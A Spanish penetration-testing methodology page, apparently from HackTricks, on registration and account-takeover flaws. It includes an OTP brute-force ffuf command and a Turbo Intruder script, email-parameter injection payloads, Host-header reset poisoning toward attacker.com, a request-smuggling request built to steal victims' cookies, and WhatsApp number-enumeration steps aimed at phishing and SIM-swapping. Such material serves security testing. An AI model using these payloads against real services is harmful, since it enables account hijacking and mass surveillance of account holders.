# Registro y vulnerabilidades de toma de control

{{#include ../banners/hacktricks-training.md}}

## Toma de control por registro

### Registro duplicado

- Intenta generar usando un nombre de usuario existente
- Prueba variaciones del email:
- mayúsculas
- +1@
- añade algún punto en el email
- caracteres especiales en la parte local del email (%00, %09, %20)
- Pon caracteres en blanco después del email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Prueba trucos de canonicalización del proveedor de email (depende del servicio):
- Gmail ignora puntos y subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` se entregan a `victim@gmail.com`
- Algunos proveedores no distinguen mayúsculas/minúsculas en la parte local
- Algunos proveedores aceptan unicode confusables. Prueba homoglyphs y soft hyphen `\u00AD` dentro de la parte local
- Abusa de esto para: bypass de checks de unicidad, obtener cuentas duplicadas/invitaciones a workspace, o bloquear registros de la víctima (DoS temporal) mientras preparas la toma

### Enumeración de nombres de usuario

Comprueba si puedes detectar cuándo un nombre de usuario ya está registrado en la aplicación.

- Diferentes mensajes de error o códigos de estado HTTP
- Diferencias de tiempo (un usuario existente puede activar una búsqueda a IdP/DB)
- Autocompletado del formulario de registro con datos de perfil para emails conocidos
- Revisa los flujos de team/invite: al introducir un email puede revelarse si existe una cuenta

### Política de contraseñas

Al crear un usuario, comprueba la política de contraseñas (ver si puedes usar contraseñas débiles).\
En ese caso podrías intentar bruteforcear credenciales.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)para aprender cómo intentar tomas de cuenta o extraer información vía **SQL Injections** en los formularios de registro.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Cambio de email

Una vez registrado intenta cambiar el email y verifica si este cambio se valida correctamente o si puedes cambiarlo a emails arbitrarios.

### Más comprobaciones

- Comprueba si puedes usar **disposable emails** (mailinator, yopmail, 1secmail, etc.) o bypassar la lista negra con subaddressing como `victim+mailinator@gmail.com`
- **Contraseña** **larga** (>200) conduce a **DoS**
- **Comprueba los límites de tasa en la creación de cuentas**
- Usa username@**burp_collab**.net y analiza el **callback**
- Si se usa verificación por número de teléfono, revisa casos límite de parsing/injection de teléfonos

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Descubrimiento de contactos / oráculos de enumeración de identificadores

Los mensajeros centrados en número de teléfono exponen un **oráculo de presencia** siempre que el cliente sincroniza contactos. Reproduciendo las peticiones de discovery de WhatsApp históricamente se obtuvieron **>100M lookups por hora**, permitiendo enumeraciones de cuentas casi completas.

**Flujo de ataque**

1. **Instrumenta un cliente oficial** para capturar la petición de subida de la libreta de direcciones (blob autenticado de números normalizados E.164). Repródúcela con números generados por el atacante reutilizando las mismas cookies/token de dispositivo.
2. **Agrupa números por petición**: WhatsApp acepta miles de identificadores y devuelve registrados/no registrados más metadata (business, companion, etc.). Analiza las respuestas offline para construir listas de objetivos sin enviar mensajes a las víctimas.
3. **Escala horizontalmente** la enumeración con SIM banks, dispositivos en cloud o proxies residenciales para que el throttling por cuenta/IP/ASN no se dispare.

**Modelado del plan de marcación**

Modela el plan de marcación de cada país para descartar candidatos inválidos. El dataset NDSS (`country-table.*`) lista códigos de país, densidad de adopción y distribución por plataforma para que puedas priorizar rangos con alta probabilidad. Código de ejemplo para el seed:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Prioritise prefijos que coincidan con asignaciones reales (Mobile Country Code + National Destination Code) antes de consultar el oracle para mantener el rendimiento útil.

**Turning enumerations into targeted attacks**

- Feed leaked phone numbers (e.g., Facebook’s 2021 breach) into the oracle to learn which identities are still active before phishing, SIM-swapping, or spamming.
- Segmenta censos por país/OS/tipo de app para encontrar regiones con filtrado de SMS débil o alta adopción de WhatsApp Business para localized social engineering.

**Public-key reuse correlation**

WhatsApp expone la clave de identidad X25519 de cada cuenta durante el establecimiento de la sesión. Solicita identity material para cada número enumerado y elimina duplicados de las claves públicas para revelar account farms, clientes clonados o firmware inseguro — las claves compartidas desanonimizan operaciones multi-SIM.

## Weak Email/Phone Verification (OTP/Magic Link)

Los flujos de registro suelen verificar la propiedad mediante un OTP numérico o un token de magic-link. Fallos típicos:

- OTP predecible o corto (4–6 dígitos) sin limitación de tasa efectiva ni seguimiento por IP/dispositivo. Prueba conjeturas en paralelo y rotación de cabeceras/IP.
- Reutilización de OTP entre acciones o cuentas, o no vinculado al usuario/acción específicos (p. ej., el mismo código funciona para inicio de sesión y registro, o funciona después de cambiar el correo).
- Multi-value smuggling: algunos backends aceptan múltiples códigos y verifican si alguno coincide. Prueba:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: distingue códigos incorrectos vs caducados vs de usuario equivocado por estado/mensaje/longitud del body.
- Tokens no invalidados tras el éxito o después de cambiar la contraseña/correo.
- El token de verificación no está vinculado al user agent/IP, permitiendo la finalización cross-origin desde páginas controladas por el atacante.

Ejemplo de fuerza bruta con ffuf contra un endpoint JSON de OTP:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Adivinación paralela/concurrente para evadir bloqueos secuenciales (usa Turbo Intruder en Burp):

<details>
<summary>Fragmento de Turbo Intruder para inundar intentos de OTP de 6‑dígitos</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Intenta racing verification: envía el mismo OTP válido simultáneamente en dos sesiones; a veces una sesión se convierte en una cuenta verificada del attacker mientras el flujo de la victim también tiene éxito.
- También prueba Host header poisoning en los verification links (igual que el reset poisoning abajo) para leak o completar la verificación en attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Una clase poderosa de issues ocurre cuando un attacker realiza acciones sobre el victim’s email antes de que la victim cree su cuenta, y luego recupera el acceso.

Técnicas clave para probar (adapta a los flujos del target):

- Classic–Federated Merge
  - Attacker: registers a classic account con victim email y establece una contraseña
  - Victim: más tarde se registra con SSO (mismo email)
  - Fusiones inseguras pueden dejar a ambas partes logueadas o resucitar el acceso del attacker
- Unexpired Session Identifier
  - Attacker: crea cuenta y mantiene una session de larga duración (no cerrar sesión)
  - Victim: recupera/establece contraseña y usa la cuenta
  - Prueba si las sesiones antiguas siguen válidas después del reset o de habilitar MFA
- Trojan Identifier
  - Attacker: añade un identificador secundario a la cuenta pre‑creada (phone, additional email, o enlaza el IdP del attacker)
  - Victim: resetea la contraseña; el attacker más tarde usa el trojan identifier para reset/login
- Unexpired Email Change
  - Attacker: inicia un email‑change a attacker mail y retiene la confirmación
  - Victim: recupera la cuenta y empieza a usarla
  - Attacker: más tarde completa el pending email‑change para robar la cuenta
- Non‑Verifying IdP
  - Attacker: usa un IdP que no verifica la propiedad del email para afirmar `victim@…`
  - Victim: se registra vía ruta classic
  - El servicio hace merge por email sin chequear `email_verified` ni realizar verificación local

Consejos prácticos

- Harvest flows y endpoints desde web/mobile bundles. Busca classic signup, SSO linking, email/phone change, y password reset endpoints.
- Crea automatización realista para mantener sessions alive mientras pruebas otros flujos.
- Para tests de SSO, monta un test OIDC provider y emite tokens con claims `email` para la dirección de la victim y `email_verified=false` para comprobar si el RP confía en IdPs no verificados.
- Después de cualquier password reset o email change, verifica que:
  - todas las otras sessions y tokens sean invalidadas,
  - las capacidades pendientes de email/phone change sean canceladas,
  - IdPs/emails/phones previamente vinculados sean re‑verificados.

Nota: Metodología extensa y estudios de caso de estas técnicas están documentados por la investigación de pre‑hijacking de Microsoft (ver References al final).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset a tu email address
2. Haz clic en el password reset link
3. No cambies la contraseña
4. Haz clic en cualquier 3rd party website (eg: Facebook, twitter)
5. Intercepta la request en el proxy de Burp Suite
6. Comprueba si el referer header está leaking el password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercepta la petición de password reset en Burp Suite
2. Añade o edita los siguientes headers en Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request con el header modificado\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Busca una password reset URL basada en el _host header_ como : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR en parámetros de API <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. El atacante debe iniciar sesión con su cuenta y acceder a la función **Cambiar contraseña**.
2. Inicia Burp Suite e intercepta la solicitud
3. Envíala a la pestaña Repeater y edita los parámetros : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Token de restablecimiento de contraseña débil <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

El password reset token should be randomly generated and unique every time.\
Intenta determinar si el token expira o si siempre es el mismo; en algunos casos el algoritmo de generación es débil y puede ser adivinado. Las siguientes variables podrían ser usadas por el algoritmo.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspecciona la respuesta del servidor y busca `resetToken`
3. Luego usa el token en una URL como `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Restablecimiento de contraseña mediante colisión de nombre de usuario <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Regístrate en el sistema con un nombre de usuario idéntico al del objetivo, pero con espacios en blanco insertados antes y/o después del nombre de usuario. e.g: `"admin "`
2. Solicita un restablecimiento de contraseña con tu nombre de usuario malicioso.
3. Usa el token enviado a tu email y restablece la contraseña de la víctima.
4. Conéctate a la cuenta de la víctima con la nueva contraseña.

La plataforma CTFd fue vulnerable a este ataque.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Secuestro de cuenta vía Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Encuentra un XSS dentro de la aplicación o en un subdominio si las cookies están scoped al dominio padre : `*.domain.com`
2. Leak la cookie de sesión actual
3. Autentícate como el usuario usando la cookie

### Secuestro de cuenta vía HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Usa **smuggler** para detectar el tipo de HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Construye una petición que sobreescriba el `POST / HTTP/1.1` con los siguientes datos:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` con el objetivo de abrir un redirect de las víctimas hacia burpcollab y robar sus cookies\
3. La petición final podría verse así
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Reportes de Hackerone sobre la explotación de este bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Secuestro de cuenta vía CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Crea un payload para el CSRF, p. ej.: “HTML form with auto submit for a password change”
2. Envía el payload

### Secuestro de cuenta vía JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token podría usarse para autenticar a un usuario.

- Editar el JWT con otro User ID / Email
- Comprueba si la firma JWT es débil


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Algunos signup handlers realizan un upsert cuando el email proporcionado ya existe. Si el endpoint acepta un body mínimo con email y password y no aplica verificación de propiedad, enviar el email de la víctima sobrescribirá su password sin autenticación.

- Descubrimiento: recolecta nombres de endpoint del JS empaquetado (o del tráfico de la app móvil), luego fuzzea rutas base como /parents/application/v4/admin/FUZZ usando ffuf/dirsearch.
- Pistas del método: un GET que devuelve mensajes como "Only POST request is allowed." suele indicar el verbo correcto y que se espera un body JSON.
- Body mínimo observado en el mundo real:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Ejemplo PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Impacto: Full Account Takeover (ATO) sin necesidad de token de restablecimiento, OTP ni verificación por correo electrónico.

## Referencias

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
